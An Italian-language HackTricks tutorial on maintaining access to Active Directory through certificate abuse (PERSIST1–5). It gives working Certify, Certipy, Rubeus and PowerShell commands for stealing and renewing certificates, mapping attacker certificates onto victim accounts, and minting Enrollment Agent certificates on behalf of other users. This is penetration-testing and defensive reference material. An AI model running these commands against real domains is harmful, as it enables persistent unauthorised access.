# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Questo è un breve riepilogo dei capitoli sulla persistenza degli account della straordinaria ricerca disponibile su [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**<sup>[[7]](#references)</sup>

## Comprendere il furto delle credenziali di un utente attivo con i certificati – PERSIST1

In uno scenario in cui un certificato che consente l'autenticazione al dominio può essere richiesto da un utente, un attaccante ha l'opportunità di richiedere e sottrarre questo certificato per mantenere la persistenza in una rete. Per impostazione predefinita, il template `User` in Active Directory consente tali richieste, anche se a volte potrebbe essere disabilitato.<sup>[[3]](#references)[[7]](#references)</sup>

Utilizzando [Certify](https://github.com/GhostPack/Certify) o [Certipy](https://github.com/ly4k/Certipy), è possibile cercare i template abilitati che consentono l'autenticazione client e quindi richiederne uno:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Il potere di un certificato risiede nella sua capacità di autenticare come l’utente a cui appartiene, indipendentemente dalle modifiche alla password, finché il certificato rimane valido.

È possibile convertire PEM in PFX e utilizzarlo per ottenere un TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Nota: combinata con altre tecniche (vedi le sezioni THEFT), l'autenticazione basata su certificati consente un accesso persistente senza interagire con LSASS e persino da contesti non elevati.

## Ottenere la persistenza della macchina con i certificati - PERSIST2

Se un attaccante dispone di privilegi elevati su un host, può iscrivere l'account macchina del sistema compromesso per ottenere un certificato utilizzando il template predefinito `Machine`. L'autenticazione come macchina abilita S4U2Self per i servizi locali e può fornire una persistenza duratura sull'host:<sup>[[3]](#references)[[7]](#references)</sup>
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Estendere la persistenza tramite il rinnovo dei certificati - PERSIST3

Abusare dei periodi di validità e rinnovo dei certificate templates consente a un attacker di mantenere l'accesso a lungo termine. Se si possiedono un certificate precedentemente emesso e la relativa private key, è possibile rinnovarlo prima della scadenza per ottenere una credenziale nuova e con validità prolungata, senza lasciare ulteriori artefatti di richiesta associati al principal originale.<sup>[[3]](#references)[[7]](#references)</sup>
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Suggerimento operativo: monitora i periodi di validità dei file PFX in possesso dell’attacker e rinnovali in anticipo. Il rinnovo può anche fare in modo che i certificati aggiornati includano l’estensione moderna di mapping SID, mantenendoli utilizzabili con regole di mapping DC più rigide (vedi la sezione successiva).

## Impostazione di Explicit Certificate Mappings (altSecurityIdentities) – PERSIST4

Se puoi scrivere nell’attributo `altSecurityIdentities` di un account target, puoi associare esplicitamente un certificato controllato dall’attacker a quell’account. Questa persistenza rimane anche dopo la modifica della password e, quando si utilizzano formati di strong mapping, continua a funzionare con l’enforcement moderno dei DC.<sup>[[2]](#references)</sup>

Flusso di alto livello:

1. Ottieni o emetti un certificato di client-auth che controlli (ad esempio, esegui l’enrollment del template `User` come te stesso).
2. Estrai un identificatore strong dal certificato (Issuer+Serial, SKI o SHA1-PublicKey).
3. Aggiungi un mapping esplicito sul principal vittima `altSecurityIdentities` utilizzando tale identificatore.
4. Esegui l’autenticazione con il tuo certificato; il DC lo associa alla vittima tramite il mapping esplicito.

Esempio (PowerShell) utilizzando un mapping strong Issuer+Serial:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Quindi autenticati con il tuo PFX. Certipy otterrà direttamente un TGT:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Creazione di mapping `altSecurityIdentities` solidi

In pratica, i mapping **Issuer+Serial** e **SKI** nei formati strong sono i più semplici da creare a partire da un certificato in possesso dell'attaccante. Questo è importante dopo l'**11 febbraio 2025**, quando i DC passeranno per impostazione predefinita a **Full Enforcement** e i mapping weak non saranno più affidabili.<sup>[[1]](#references)</sup>
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Note
- Utilizzare solo tipi di mapping avanzati: `X509IssuerSerialNumber`, `X509SKI` o `X509SHA1PublicKey`. I formati deboli (Subject/Issuer, solo Subject, email RFC822) sono deprecati e possono essere bloccati dalla policy del DC.
- Il mapping funziona sia sugli oggetti **user** sia sugli oggetti **computer**, quindi l'accesso in scrittura all'attributo `altSecurityIdentities` dell'account di un computer è sufficiente per mantenere la persistenza come quella macchina.
- La catena del certificato deve risalire a una root considerata trusted dal DC. Le Enterprise CA presenti in NTAuth sono generalmente trusted; in alcuni ambienti sono trusted anche alcune CA pubbliche.
- L'autenticazione Schannel rimane utile per la persistenza anche quando PKINIT fallisce perché il DC non dispone dell'EKU Smart Card Logon o restituisce `KDC_ERR_PADATA_TYPE_NOSUPP`.

#### Mapping espliciti `Issuer/SID` dal 2025 in poi

Sui domain controller **Windows Server 2022+** con la security update di Microsoft del **9 settembre 2025**, Microsoft ha aggiunto un altro formato di mapping esplicito avanzato, interessante per la persistenza perché sopravvive alla riemissione del certificato dalla stessa CA:<sup>[[6]](#references)</sup>
```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Dal punto di vista operativo, questo differisce dai formati strong precedenti:
- `Issuer+Serial` associa **un solo certificato esatto**.
- `SKI` / `SHA1-PUKEY` associa **una sola coppia di chiavi**.
- `Issuer/SID` associa **la CA emittente + il SID target**, quindi i certificati rinnovati o riemessi dalla stessa CA continuano a funzionare senza dover riscrivere `altSecurityIdentities`.

Requisiti e limitazioni
- Il certificato presentato per il logon deve contenere effettivamente il SID dell'account target nella SID security extension.
- Questo formato non è utile per certificati in stile `ESC9` / `ESC16` che omettono la SID extension; in questi casi, usa `Issuer+Serial`, `SKI` o `SHA1-PUKEY`.

Per ulteriori informazioni sulle weak explicit mappings e sui percorsi di attacco, consulta:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent come Persistence – PERSIST5

Se ottieni un certificato valido di Certificate Request Agent/Enrollment Agent, puoi creare a piacimento nuovi certificati utilizzabili per il logon per conto degli utenti e mantenere il PFX dell'agent offline come token di persistence. Workflow di abuso:<sup>[[7]](#references)</sup>
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
La revoca del certificato dell'agent o delle autorizzazioni del template è necessaria per eliminare questa persistence.

Note operative
- Le versioni moderne di `Certipy` supportano sia `-on-behalf-of` sia `-renew`, quindi un attacker in possesso di un PFX dell'Enrollment Agent può creare e successivamente rinnovare leaf certificates senza dover interagire nuovamente con l'account target originale.<sup>[[4]](#references)</sup>
- Se il recupero del TGT basato su PKINIT non è possibile, il certificato on-behalf-of risultante è comunque utilizzabile per l'autenticazione Schannel con `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.<sup>[[5]](#references)</sup>

## Utilizzo dei certificati persistiti quando PKINIT fallisce

Se il DC non dispone di un certificato compatibile con Smart Card Logon, il logon tramite certificato via PKINIT può fallire con `KDC_ERR_PADATA_TYPE_NOSUPP`. Questo **non** elimina la persistence primitive: lo stesso PFX è spesso ancora utilizzabile per l'accesso LDAP autenticato tramite Schannel.<sup>[[5]](#references)</sup>
```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```
Ciò è particolarmente utile dopo PERSIST4/PERSIST5, perché puoi continuare a operare da Linux/macOS e concatenare altre azioni di persistence nella directory, come il deposito di [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) o la modifica di attributi di delega scrivibili.

## 2025 Strong Certificate Mapping Enforcement: impatto sulla persistence

Microsoft KB5014754 ha introdotto Strong Certificate Mapping Enforcement sui domain controller. Dall'**11 febbraio 2025**, i DC utilizzano per impostazione predefinita la modalità **Full Enforcement** per i mapping deboli/ambigui e, a partire dall'aggiornamento di sicurezza del **9 settembre 2025**, i DC aggiornati non supportano più il vecchio fallback della modalità Compatibility.<sup>[[1]](#references)</sup> Implicazioni pratiche:

- I certificati precedenti al 2022 privi dell'estensione di mapping SID potrebbero non riuscire nel mapping implicito quando i DC sono in modalità Full Enforcement. Gli attaccanti possono mantenere l'accesso rinnovando i certificati tramite AD CS (per ottenere l'estensione SID) oppure inserendo un mapping esplicito forte in `altSecurityIdentities` (PERSIST4).
- I mapping espliciti che utilizzano formati forti (`Issuer+Serial`, `SKI`, `SHA1-PUKEY` e, sui DC moderni, `Issuer/SID`) continuano a funzionare. I formati deboli (Issuer/Subject, Subject-only, RFC822) possono essere bloccati e dovrebbero essere evitati per la persistence.
- Se i mapping deboli sembrano ancora funzionare, presupponi di aver incontrato un DC non aggiornato o configurato diversamente, anziché considerarlo un percorso di persistence affidabile a lungo termine.
- I percorsi di issuance in stile `ESC9` / `ESC16` che sopprimono l'estensione SID rendono inutilizzabile `Issuer/SID`; pertanto, i mapping forti alternativi o il rinnovo tramite un template normale diventano le opzioni pratiche per la persistence.

Gli amministratori dovrebbero monitorare e generare alert per:
- Modifiche a `altSecurityIdentities` e issuance/rinnovi di certificati Enrollment Agent e User.
- I log di issuance della CA per le richieste on-behalf-of e i pattern di rinnovo insoliti.

## Riferimenti

- [1] [Microsoft Support – KB5014754: modifiche all'autenticazione basata su certificati sui domain controller Windows](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [SpecterOps – tecnica di abuso ADCS ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [3] [GhostPack/Certify Wiki – tecniche di Account Persistence](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [4] [Certipy Wiki – riferimento dei comandi](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [5] [Almond Offensive Security – autenticazione con certificati quando PKINIT non è supportato](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [6] [Microsoft Community Hub – introduzione di un nuovo Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)
- [7] [SpecterOps – Certified Pre-Owned: abuso di Active Directory Certificate Services](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)

{{#include ../../../banners/hacktricks-training.md}}
